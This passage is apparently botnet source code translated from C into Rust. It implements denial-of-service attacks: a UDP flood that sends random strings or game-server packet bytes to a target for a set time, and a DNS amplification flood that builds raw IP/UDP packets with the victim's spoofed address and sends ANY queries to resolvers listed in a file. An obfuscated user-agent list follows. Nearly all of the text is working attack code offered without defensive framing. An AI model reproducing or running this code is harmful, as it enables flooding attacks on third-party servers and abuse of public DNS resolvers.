        b"\x13\x8Di\x19\x08\0\x01\0\x14\x80\xA0\0\x01\xA8a\0\0\x07\0\x10\0M\xB6'\x06h\xF7\x04\x9D\0\0\0\xBC\x1C\x85\xB5\x95\xBD4\x85\xC1\xCD\xBDP\xA1\x95%\xCD\xB1\x85\xB9\x91M\xD5\x895\x85\xC1\xCD\xBD\x10\xC5|\x19\x85\xC9}]%A\x01\0\0\0\0\xF4\xC4\0\xED\x9E\xA0\x13\0\0\x80\x97\xA3\xB0\xB6\xB2\x97\xA60\xB8\xB9\x17*\xB4\xB2\xA49\xB607\xB2\xA9:\xB1\xA60\xB8\xB9\x17\"\x99/\xA30\xB9\xAF\xAB$(\0\0\0\0\x80\x9E\x18\xA0\xDD\x13t\x02\0\0\xF0r\x14\xD6V\xF6\xD2\x14\x067\xF7B\x85V\x964\xC7\x16\xE6F6U'\xD6\x14\x067\xF7B4\xF3e\x14&\xF7u\x95\x04\x05\0\0\0\0\xD0\x13\x03\xB4{\x82N\0\0\0^\x8E\xC2\xDA\xCA^\x9A\xC2\xE0\xE6^\xA8\xD0\xCA\x92\xE6\xD8\xC2\xDC\xC8\xA6\xEA\xC4\x9A\xC2\xE0\xE6^\x8Ab\xBE\x8C\xC2\xE4\xBE\xAE\x92\xA0\0\0\0\0\0zb\x80vO\xD0\t\0\0\xC0\xCBQX[\xD9KS\x18\xDC\xDC\x0B\x15ZY\xD2\x1C[\x98\x1B\xD9T\x9DXS\x18\xDC\xDCK\x91\xCC\x97Q\x98\xDC\xD7U\x12\x14\0\0\0\0@o\x0C\xD0\x0E\x0CB\x01\0\0x9\nk+{i\n\x83\x9B{\xA1B+K\x9Ac\x0Bs#\x9B\xAA\x13k\n\x83\x9B{)\x92\xF9r*\x0B\x93\xFB\xBAJ\x82\x02\0\0\0\0\xE8\x89\x01\xDA=A'\0\0\0/Game/Maps/TheIslandSubMaps/E3_Far_WIP\0\0\0\0\0\xBD5@;4\x08\x06\0\0\xE0\xE5(\xAC\xAD\xEC\xA5)\x0Cn\xEE\x85\n\xAD,i\x8E-\xCC\x8Dl\xAAN\xAC)\x0Cn\xEE\xA5\xCA\x8D\xACL\xEE*\x8C\xAEL\xEEk\xEA\xAD\x8E\x0E\xED\x0BF\x06\0\0\0\0\xA0\"\x1E\x01\x8E\0I\x80%@\x13\xE0\t\x10\x05\x98\x02T\x01\xAE\0Y\x80-@\x17\xE0\x0B\x10\x06\x08\0\0\00\x06(\x03\x9C\x01\xD2\0k\x806\xC0\x1B \x0E0\x07\xA8\x03\xDC\x01\xF2\0{\x80>\xC0\x1F \0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x8Di\x19\0ES\xE3\xA9\xC1\x01\0\x18@\x16a\x02A\xCAk\x81\x01\0\0\0\xF6\x13\0\0\x11\0\0\0PrimalInventory1\0F5\xC0\x0B@'\xD0\xF2\x11\0\x88 \xC0t\x81\xF4\x1D\x08Bi\x9A\xED\x9Ar0\0\0\x807v\xD4q\x02\xDD*\xEF\x940'\x8F\xE9\0\xA7\xCF\x14\x08\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x8Di\x19\x99\xE9}7\xBF\xCB\x01\0@@\x16a\x02A\xCAk\x81\x01\0\0\0v\xE3\x01\0\x11\0\0\0PrimalInventory1\0\xEEw\xC1\x0B@+\xD0\xF2\x11\0\x88\"\xC0\x14\x82Z\xF3\nCi\x11\x8C\xAE\xDB\xF8\0\0\x807X\xB4\x9C\x02\xE0\x99\xEBd\xA0%\x8F\xB9\xFD'\xE9K\x0F\0\0\x0C\x08\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x8Di\x19\x94A\xBEa\xDF\xC0\x01\0\xC3@\x16a\x02A\xCAk\x81\x01\0\0\0\xA8\x11\0\0\x11\0\0\0PrimalInventory1\0\xF6\x1B\xFE\r\xE0\x05\xA0\x1Dh\xF9\x08\0\xB03\xF5\xEB\xFBD\xA1t\xD7|@\"h\x01\0@h\xF9\x08\0D\x10`\xBA@\x88\x15E\xA1\x14s\x8BP\no\x01\0\xC0\x1B-\x08*AV\x8Dw\xD7\xAA\x92\xC7\x98\xFB\x176\n\x04\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x8Di\x19\x08\0\x01\0\x14\x80\xA0\0\x01\xA8a\0\0\x07\0\x10\0M\xB6'\x06h\xF7\x04\x9D\0\0\0\xBC\x1C\x85\xB5\x95\xBD4\x85\xC1\xCD\xBDP\xA1\x95%\xCD\xB1\x85\xB9\x91M\xD5\x895\x85\xC1\xCD\xBD\x10\xC5|\x19\x85\xC9}]%A\x01\0\0\0\0\xF4\xC4\0\xED\x9E\xA0\x13\0\0\x80\x97\xA3\xB0\xB6\xB2\x97\xA60\xB8\xB9\x17*\xB4\xB2\xA49\xB607\xB2\xA9:\xB1\xA60\xB8\xB9\x17\"\x99/\xA30\xB9\xAF\xAB$(\0\0\0\0\x80\x9E\x18\xA0\xDD\x13t\x02\0\0\xF0r\x14\xD6V\xF6\xD2\x14\x067\xF7B\x85V\x964\xC7\x16\xE6F6U'\xD6\x14\x067\xF7B4\xF3e\x14&\xF7u\x95\x04\x05\0\0\0\0\xD0\x13\x03\xB4{\x82N\0\0\0^\x8E\xC2\xDA\xCA^\x9A\xC2\xE0\xE6^\xA8\xD0\xCA\x92\xE6\xD8\xC2\xDC\xC8\xA6\xEA\xC4\x9A\xC2\xE0\xE6^\x8Ab\xBE\x8C\xC2\xE4\xBE\xAE\x92\xA0\0\0\0\0\0zb\x80vO\xD0\t\0\0\xC0\xCBQX[\xD9KS\x18\xDC\xDC\x0B\x15ZY\xD2\x1C[\x98\x1B\xD9T\x9DXS\x18\xDC\xDCK\x91\xCC\x97Q\x98\xDC\xD7U\x12\x14\0\0\0\0@o\x0C\xD0\x0E\x0CB\x01\0\0x9\nk+{i\n\x83\x9B{\xA1B+K\x9Ac\x0Bs#\x9B\xAA\x13k\n\x83\x9B{)\x92\xF9r*\x0B\x93\xFB\xBAJ\x82\x02\0\0\0\0\xE8\x89\x01\xDA=A'\0\0\0/Game/Maps/TheIslandSubMaps/E3_Far_WIP\0\0\0\0\0\xBD5@;4\x08\x06\0\0\xE0\xE5(\xAC\xAD\xEC\xA5)\x0Cn\xEE\x85\n\xAD,i\x8E-\xCC\x8Dl\xAAN\xAC)\x0Cn\xEE\xA5\xCA\x8D\xACL\xEE*\x8C\xAEL\xEEk\xEA\xAD\x8E\x0E\xED\x0BF\x06\0\0\0\0\xA0\"\x1E\x01\x8E\0I\x80%@\x13\xE0\t\x10\x05\x98\x02T\x01\xAE\0Y\x80-@\x17\xE0\x0B\x10\x06\x08\0\0\00\x06(\x03\x9C\x01\xD2\0k\x806\xC0\x1B \x0E0\x07\xA8\x03\xDC\x01\xF2\0{\x80>\xC0\x1F \0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"De\xCA1\xD82\x10\0h\x05Z>\x02\0Q\x04\x98B0\xF7\0E(\xFD\xDB'U\xB3}\0\0\xF0\x06\x93&:p\xC9\xB8\x9E\xF8\xC4\xE4\x11\x07~\xE9\xE5\xB4\x04\0\x80%c%c%c\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
    ];
    loop {
        let mut pkt_str: *mut libc::c_char = randstrings[(rand() as libc::c_ulong)
            .wrapping_rem(
                (::std::mem::size_of::<[*mut libc::c_char; 15]>() as libc::c_ulong)
                    .wrapping_div(
                        ::std::mem::size_of::<*mut libc::c_char>() as libc::c_ulong,
                    ),
            ) as usize];
        if !(strstr(pkt_str, b"%c%c%c\0" as *const u8 as *const libc::c_char)).is_null()
        {
            let mut xd: [libc::c_char; 256] = [0; 256];
            memset(
                xd.as_mut_ptr() as *mut libc::c_void,
                0 as libc::c_int,
                256 as libc::c_int as libc::c_ulong,
            );
            sprintf(
                xd.as_mut_ptr(),
                pkt_str,
                rand() % 256 as libc::c_int,
                rand() % 256 as libc::c_int,
                rand() % 256 as libc::c_int,
            );
            n = sendto(
                sockfd,
                xd.as_mut_ptr() as *const libc::c_void,
                strlen(pkt_str),
                0 as libc::c_int,
                &mut serveraddr as *mut sockaddr_in as *mut sockaddr,
                serverlen as socklen_t,
            ) as libc::c_int;
        } else {
            if a >= 50 as libc::c_int {
                n = sendto(
                    sockfd,
                    pkt_str as *const libc::c_void,
                    strlen(pkt_str),
                    0 as libc::c_int,
                    &mut serveraddr as *mut sockaddr_in as *mut sockaddr,
                    serverlen as socklen_t,
                ) as libc::c_int;
                if time(0 as *mut time_t) >= (start + secs) as libc::c_long {
                    _exit(0 as libc::c_int);
                }
                a = 0 as libc::c_int;
            }
            a += 1;
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn dns_format(
    mut dns: *mut libc::c_uchar,
    mut host: *mut libc::c_uchar,
) {
    let mut lock: libc::c_int = 0 as libc::c_int;
    let mut i_0: libc::c_int = 0;
    strcat(host as *mut libc::c_char, b".\0" as *const u8 as *const libc::c_char);
    i_0 = 0 as libc::c_int;
    while (i_0 as libc::c_ulong) < strlen(host as *mut libc::c_char) {
        if *host.offset(i_0 as isize) as libc::c_int == '.' as i32 {
            let fresh52 = dns;
            dns = dns.offset(1);
            *fresh52 = (i_0 - lock) as libc::c_uchar;
            while lock < i_0 {
                let fresh53 = dns;
                dns = dns.offset(1);
                *fresh53 = *host.offset(lock as isize);
                lock += 1;
            }
            lock += 1;
        }
        i_0 += 1;
    }
    let fresh54 = dns;
    dns = dns.offset(1);
    *fresh54 = 0 as libc::c_int as libc::c_uchar;
}
#[no_mangle]
pub unsafe extern "C" fn dns_hdr_create(mut dns: *mut dns_hdr) {
    (*dns).id = htons(getpid() as uint16_t);
    (*dns).flags = htons(0x100 as libc::c_int as uint16_t);
    (*dns).qcount = htons(1 as libc::c_int as uint16_t);
    (*dns).ans = 0 as libc::c_int as libc::c_ushort;
    (*dns).auth = 0 as libc::c_int as libc::c_ushort;
    (*dns).add = 0 as libc::c_int as libc::c_ushort;
}
#[no_mangle]
pub unsafe extern "C" fn dns_send(
    mut trgt_ip: *mut libc::c_char,
    mut trgt_p: libc::c_int,
    mut dns_srv: *mut libc::c_char,
    mut dns_record: *mut libc::c_uchar,
) {
    let mut dns_data: [libc::c_uchar; 128] = [0; 128];
    let mut dns: *mut dns_hdr = &mut dns_data as *mut [libc::c_uchar; 128]
        as *mut dns_hdr;
    dns_hdr_create(dns);
    let mut dns_name: *mut libc::c_uchar = 0 as *mut libc::c_uchar;
    let mut dns_rcrd: [libc::c_uchar; 32] = [0; 32];
    dns_name = &mut *dns_data
        .as_mut_ptr()
        .offset(::std::mem::size_of::<dns_hdr>() as libc::c_ulong as isize)
        as *mut libc::c_uchar;
    strcpy(
        dns_rcrd.as_mut_ptr() as *mut libc::c_char,
        dns_record as *const libc::c_char,
    );
    dns_format(dns_name, dns_rcrd.as_mut_ptr());
    let mut q: *mut query = 0 as *mut query;
    q = &mut *dns_data
        .as_mut_ptr()
        .offset(
            (::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
                .wrapping_add(
                    ((strlen
                        as unsafe extern "C" fn(
                            *const libc::c_char,
                        ) -> libc::c_ulong)(dns_name as *const libc::c_char))
                        .wrapping_add(1 as libc::c_int as libc::c_ulong),
                ) as isize,
        ) as *mut libc::c_uchar as *mut query;
    (*q).qtype = htons(0xff as libc::c_int as uint16_t);
    (*q).qclass = htons(0x1 as libc::c_int as uint16_t);
    let mut datagram: [libc::c_char; 4096] = [0; 4096];
    let mut data: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut psgram: *mut libc::c_char = 0 as *mut libc::c_char;
    memset(
        datagram.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        4096 as libc::c_int as libc::c_ulong,
    );
    data = datagram
        .as_mut_ptr()
        .offset(::std::mem::size_of::<iph>() as libc::c_ulong as isize)
        .offset(::std::mem::size_of::<udph>() as libc::c_ulong as isize);
    memcpy(
        data as *mut libc::c_void,
        &mut dns_data as *mut [libc::c_uchar; 128] as *const libc::c_void,
        (::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
            .wrapping_add(
                (strlen(dns_name as *const libc::c_char))
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            )
            .wrapping_add(::std::mem::size_of::<query>() as libc::c_ulong)
            .wrapping_add(1 as libc::c_int as libc::c_ulong),
    );
    let mut sin: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    sin.sin_family = 2 as libc::c_int as sa_family_t;
    sin.sin_port = htons(53 as libc::c_int as uint16_t);
    sin.sin_addr.s_addr = inet_addr(dns_srv);
    let mut ip: *mut iph = datagram.as_mut_ptr() as *mut iph;
    (*ip).set_version(4 as libc::c_int as libc::c_uint);
    (*ip).set_ihl(5 as libc::c_int as libc::c_uint);
    (*ip).tos = 0 as libc::c_int as uint8_t;
    (*ip)
        .tot_len = (::std::mem::size_of::<iph>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<udph>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
        .wrapping_add(
            (strlen(dns_name as *const libc::c_char))
                .wrapping_add(1 as libc::c_int as libc::c_ulong),
        )
        .wrapping_add(::std::mem::size_of::<query>() as libc::c_ulong) as uint16_t;
    (*ip).id = htonl(rand_cmwc() & 0xffffffff as libc::c_uint) as uint16_t;
    (*ip).frag_off = 0 as libc::c_int as uint16_t;
    (*ip).ttl = 64 as libc::c_int as uint8_t;
    (*ip).protocol = IPPROTO_UDP as libc::c_int as uint8_t;
    (*ip).check = 0 as libc::c_int as uint16_t;
    (*ip).saddr = inet_addr(trgt_ip);
    (*ip).daddr = sin.sin_addr.s_addr;
    (*ip)
        .check = csum(
        datagram.as_mut_ptr() as *mut libc::c_ushort,
        (*ip).tot_len as libc::c_int,
    );
    let mut udp: *mut udph = datagram
        .as_mut_ptr()
        .offset(::std::mem::size_of::<iph>() as libc::c_ulong as isize) as *mut udph;
    (*udp).source = htons(trgt_p as uint16_t);
    (*udp).dest = htons(53 as libc::c_int as uint16_t);
    (*udp)
        .len = htons(
        (8 as libc::c_int as libc::c_ulong)
            .wrapping_add(::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
            .wrapping_add(
                (strlen(dns_name as *const libc::c_char))
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            )
            .wrapping_add(::std::mem::size_of::<query>() as libc::c_ulong) as uint16_t,
    );
    (*udp).check = 0 as libc::c_int as uint16_t;
    let mut pshdr: ps_hdr = ps_hdr {
        saddr: 0,
        daddr: 0,
        filler: 0,
        protocol: 0,
        len: 0,
    };
    pshdr.saddr = inet_addr(trgt_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0 as libc::c_int as u_int8_t;
    pshdr.protocol = IPPROTO_UDP as libc::c_int as u_int8_t;
    pshdr
        .len = htons(
        (::std::mem::size_of::<udph>() as libc::c_ulong)
            .wrapping_add(::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
            .wrapping_add(
                (strlen(dns_name as *const libc::c_char))
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            )
            .wrapping_add(::std::mem::size_of::<query>() as libc::c_ulong) as uint16_t,
    );
    let mut pssize: libc::c_int = (::std::mem::size_of::<ps_hdr>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<udph>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
        .wrapping_add(
            (strlen(dns_name as *const libc::c_char))
                .wrapping_add(1 as libc::c_int as libc::c_ulong),
        )
        .wrapping_add(::std::mem::size_of::<query>() as libc::c_ulong) as libc::c_int;
    psgram = malloc(pssize as libc::c_ulong) as *mut libc::c_char;
    memcpy(
        psgram as *mut libc::c_void,
        &mut pshdr as *mut ps_hdr as *mut libc::c_char as *const libc::c_void,
        ::std::mem::size_of::<ps_hdr>() as libc::c_ulong,
    );
    memcpy(
        psgram.offset(::std::mem::size_of::<ps_hdr>() as libc::c_ulong as isize)
            as *mut libc::c_void,
        udp as *const libc::c_void,
        (::std::mem::size_of::<udph>() as libc::c_ulong)
            .wrapping_add(::std::mem::size_of::<dns_hdr>() as libc::c_ulong)
            .wrapping_add(
                (strlen(dns_name as *const libc::c_char))
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            )
            .wrapping_add(::std::mem::size_of::<query>() as libc::c_ulong),
    );
    (*udp).check = csum(psgram as *mut libc::c_ushort, pssize);
    let mut sd: libc::c_int = socket(
        2 as libc::c_int,
        SOCK_RAW as libc::c_int,
        IPPROTO_RAW as libc::c_int,
    );
    if sd == -(1 as libc::c_int) {
        return
    } else {
        sendto(
            sd,
            datagram.as_mut_ptr() as *const libc::c_void,
            (*ip).tot_len as size_t,
            0 as libc::c_int,
            &mut sin as *mut sockaddr_in as *mut sockaddr,
            ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
        );
    }
    free(psgram as *mut libc::c_void);
    close(sd);
}
#[no_mangle]
pub unsafe extern "C" fn dnsflood(mut par1: *mut libc::c_void) {
    if listFork() == 0 {
        return;
    }
    let mut td: *mut thread_data = par1 as *mut thread_data;
    let mut target: *mut libc::c_char = (*td).target;
    let mut dport: libc::c_int = (*td).dport;
    let mut secs: libc::c_int = (*td).time;
    let mut buffer: [libc::c_char; 100] = [0; 100];
    srand((time(0 as *mut time_t) ^ getpid() as libc::c_long) as libc::c_uint);
    let mut i_0: libc::c_int = 0;
    let mut end: libc::c_int = (time(0 as *mut time_t) + secs as libc::c_long)
        as libc::c_int;
    while time(0 as *mut time_t) < end as libc::c_long {
        let mut fp: *mut FILE = fopen(
            b"DNS.txt\0" as *const u8 as *const libc::c_char,
            b"r\0" as *const u8 as *const libc::c_char,
        );
        while !(fgets(buffer.as_mut_ptr(), 100 as libc::c_int, fp)).is_null() {
            buffer[strcspn(
                buffer.as_mut_ptr(),
                b"\r\n\0" as *const u8 as *const libc::c_char,
            ) as usize] = 0 as libc::c_int as libc::c_char;
            dns_send(
                target,
                dport,
                buffer.as_mut_ptr(),
                b"pixnet.net\0" as *const u8 as *const libc::c_char as *mut libc::c_uchar,
            );
        }
        fclose(fp);
    }
    exit(0 as libc::c_int);
}
#[no_mangle]
pub unsafe extern "C" fn sendPkt(
    mut host: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut secs: libc::c_int,
) {
    let mut a: libc::c_int = 0 as libc::c_int;
    let mut start: libc::c_int = time(0 as *mut time_t) as libc::c_int;
    let mut sockfd: libc::c_int = 0;
    let mut portno: libc::c_int = 0;
    let mut n: libc::c_int = 0;
    let mut serverlen: libc::c_int = 0;
    let mut serveraddr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    sockfd = socket(2 as libc::c_int, SOCK_DGRAM as libc::c_int, 0 as libc::c_int);
    if sockfd < 0 as libc::c_int {
        return;
    }
    bzero(
        &mut serveraddr as *mut sockaddr_in as *mut libc::c_char as *mut libc::c_void,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    serveraddr.sin_family = 2 as libc::c_int as sa_family_t;
    if getHost(host, &mut serveraddr.sin_addr) != 0 {
        return;
    }
    serveraddr
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    serverlen = ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as libc::c_int;
    let mut randstrings: [*mut libc::c_char; 24] = [
        b"PozHlpiND4xPDPuGE6tq\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"tg57YSAcuvy2hdBlEWMv\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"VaDp3Vu5m5bKcfCU96RX\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"UBWcPjIZOdZ9IAOSZAy6\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"JezacHw4VfzRWzsglZlF\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"3zOWSvAY2dn9rKZZOfkJ\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"oqogARpMjAvdjr9Qsrqj\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"yQAkUvZFjxExI3WbDp2g\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"35arWHE38SmV9qbaEDzZ\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"kKbPlhAwlxxnyfM3LaL0\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"a7pInUoLgx1CPFlGB5JF\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"yFnlmG7bqbW682p7Bzey\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"S1mQMZYF6uLzzkiULnGF\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"jKdmCH3hamvbN7ZvzkNA\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"bOAFqQfhvMFEf9jEZ89M\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"VckeqgSPaAA5jHdoFpCC\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"CwT01MAGqrgYRStHcV0X\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"72qeggInemBIQ5uJc1jQ\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"zwcfbtGDTDBWImROXhdn\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"w70uUC1UJYZoPENznHXB\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"EoXLAf1xXR7j4XSs0JTm\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"lgKjMnqBZFEvPJKpRmMj\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"lSvZgNzxkUyChyxw1nSr\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"VQz4cDTxV8RRrgn00toF\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
    ];
    loop {
        let mut pkt_str: *mut libc::c_char = randstrings[(rand() as libc::c_ulong)
            .wrapping_rem(
                (::std::mem::size_of::<[*mut libc::c_char; 24]>() as libc::c_ulong)
                    .wrapping_div(
                        ::std::mem::size_of::<*mut libc::c_char>() as libc::c_ulong,
                    ),
            ) as usize];
        if a >= 50 as libc::c_int {
            n = sendto(
                sockfd,
                pkt_str as *const libc::c_void,
                strlen(pkt_str),
                0 as libc::c_int,
                &mut serveraddr as *mut sockaddr_in as *mut sockaddr,
                serverlen as socklen_t,
            ) as libc::c_int;
            if time(0 as *mut time_t) >= (start + secs) as libc::c_long {
                _exit(0 as libc::c_int);
            }
            a = 0 as libc::c_int;
        }
        a += 1;
    };
}
#[no_mangle]
pub static mut useragents: [*mut libc::c_char; 32] = [
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04\xEBP\x97PB4w\x19\xFF*oB4\xC1*o\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'\xCF\xD0\x97P\x97\xE2PG\xEB\x97\x9A*4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04\xEBP\x97PB4w\x19\xFF*oB4\xC1*o\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'*\xEB\x97P\x97\xE2\xEB*\xE2\x97\xEBPP4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bb\x90\xCE\x19\xFF9\xB9\x03eB4h\xFF9Q<4b\x90\xCE4\tF4^4\xEBP\xB4\xEB\xE2\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'*Po\x97\xEB\x97\xE2\x9A4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\x1CQ\xE7\x03\x19\xB9\xFF'\xEB\xEB\x97P4F\x90u\x90\xE7\x19'*Po\x97\xEB\x97\xE2\x9A\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\x19\x1Ee\xB9\xFFQB4\xDA\x1E\xBC4\x19\x1Ee\xB9\xFFQ4\tF4G\xB4P4<\x19xQ4b\x90\xCE4\tF4^\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xCF\xEB\x97\xEB4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\x1CQ\xE7\x03\x19\xB9\xFF'G\x97P4b\xB9\xD2\x19<Q'\xEB\xEB\xA4o*\xCF4F\x90u\x90\xE7\x19'\xD0\xCF\xE2G\x97\xCF\xE2\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04*\x97\xEBB4w\tw*oB4\xE7\xFC\xF1\xCF\x86\x97P\xD34\xD7Q\xCEx\xB9'\x86P\xEBPP\xEBP\xEB4\x14\x19\xE7Qu\xB9\xC1'\xCF\x86\x97P\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B^\xEB\xEBB4\xDA\xE7\tF4\xC1\x9A*\xB4*o4\xD0\xCF\xD0\x86\x97\xD0*\x97P\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'*P\x97P\x97\xE2\xEB\xEB\x86\x97\xEB\xEBo4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\\\x19\xFF\xE4\xC1B4\xA4\xFFa\xE7\xB9\x19a4G\x97PB4F\xA4bF\xBC\xD9\xD74Fb\xDC\xD7\xD0\xE2Pw\x9A45\xE4\x19<a'\xD96\xCD\xD0Pb\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34F\x90\xD4\x03\xE4\xFF\xF95\xE7\xB9Z\x03Q\xE7'\xCF\x97o4\xDAe\xE7\xB9\xD4Q'\xCF\xEB\x97P\x97\x86GPo\x97\xEBP*4b\xB9\xD2\x19<Q4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04\xEBP\x97PB4w\x19\xFF*oB4\xC1*o\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'*P\x97P\x97\xE2\xEB\xEB\x86\x97\xEB\xEB\xE24F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\x1Ee\xB9\xFFQ4\xEBP\x97PB4\xA4\xFFa\xE7\xB9\x19a4*\x97P\x97\xEBB4b\x19\xCE\xE7\xB9\x03\xB9u9B4\\\xE4\xD4\x19\x904\xCF\xE2\xCF\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'\xCF\xEB\x97P\x97\x86GPo\x97G\xD04b\xB9\xD2\x19<Q4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*4\x9Da\xF9Q'\xEBo\x97\xEBo\xE2\xD0\xE2\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\\\x19\xFF\xE4\xC1B4\xA4\xFFa\xE7\xB9\x19a4o\x97o\x97oB4\xC3\xB0\xDA4\xCDQ\x03\x19\xE7Q4*\x86P45\xE4\x19<a'L\xB0\xBC\x9Ao\x1E\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\x1CQ\xE7\x03\x19\xB9\xFF'o\x97P4\xDAe\xE7\xB9\xD4Q'\xE2\xE2\x97P\x97P\x97P4b\xB9\xD2\x19<Q4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
